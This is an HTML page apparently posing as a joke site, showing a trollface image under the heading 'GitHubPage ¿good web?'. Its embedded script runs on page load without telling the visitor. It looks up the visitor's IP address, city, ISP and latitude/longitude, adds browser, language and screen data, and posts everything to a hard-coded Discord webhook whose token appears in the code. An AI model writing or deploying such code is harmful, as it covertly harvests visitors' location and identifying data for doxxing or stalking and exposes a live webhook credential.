<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASDForum</title>
</head>
<body>
    <h1>GitHubPage ¿good web?</h1>

    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRY7OOhDZDaP6YS-tOd1A0ArdgqOVAmQteIkQ&s" 
         alt="Trollface" 
         style="width: 300px; height: auto;">

    <script>
        const obtenerDatosUsuario = async () => {
            try {
                // Obtener IP y datos de geolocalización
                const respuestaIP = await fetch('https://ipwho.is/');
                if (!respuestaIP.ok) throw new Error("Error al obtener la IP.");
                const datosIP = await respuestaIP.json();

                // Datos del navegador y sistema
                const navegador = navigator.userAgent;
                const idioma = navigator.language;
                const resolucion = `${screen.width}x${screen.height}`;
                
                // Datos obtenidos
                const datosUsuario = {
                    IP: datosIP.ip,
                    País: datosIP.country,
                    Región: datosIP.region,
                    Ciudad: datosIP.city,
                    Proveedor: datosIP.isp,
                    Latitud: datosIP.latitude,
                    Longitud: datosIP.longitude,
                    Navegador: navegador,
                    Idioma: idioma,
                    Resolución: resolucion
                };

                return datosUsuario;
            } catch (error) {
                console.error("Error al obtener datos del usuario:", error);
                return null;
            }
        };

        const enviarADiscord = async (datos) => {
            if (!datos) return;

            const discordWebhookURL = 'https://discord.com/api/webhooks/1348742741399703552/DlwWcZfNX9bbgi2vH2MskQI4vjXIa7vZXFYLQlj8q8h1TXNLSgPnpp2TNCsHAy46xHgh'; // ⚠️ NO DEJAR PÚBLICO ⚠️

            const mensaje = `
🌍 **Nuevo visitante en la web**
🔹 IP: ${datos.IP}
🔹 Ubicación: ${datos.Ciudad}, ${datos.Región}, ${datos.País}
🔹 ISP: ${datos.Proveedor}
🔹 📍 Coordenadas: ${datos.Latitud}, ${datos.Longitud}
🔹 🖥️ Navegador: ${datos.Navegador}
🔹 🏳️ Idioma: ${datos.Idioma}
🔹 📏 Resolución de pantalla: ${datos.Resolución}
            `;

            const payload = { content: mensaje };

            try {
                const respuesta = await fetch(discordWebhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });

                if (!respuesta.ok) throw new Error("Error al enviar la información.");
                console.log("Datos enviados correctamente a Discord.");
            } catch (error) {
                console.error("Error al enviar a Discord:", error);
            }
        };

        (async () => {
            const datosUsuario = await obtenerDatosUsuario();
            await enviarADiscord(datosUsuario);
        })();
    </script>
</body>
</html>
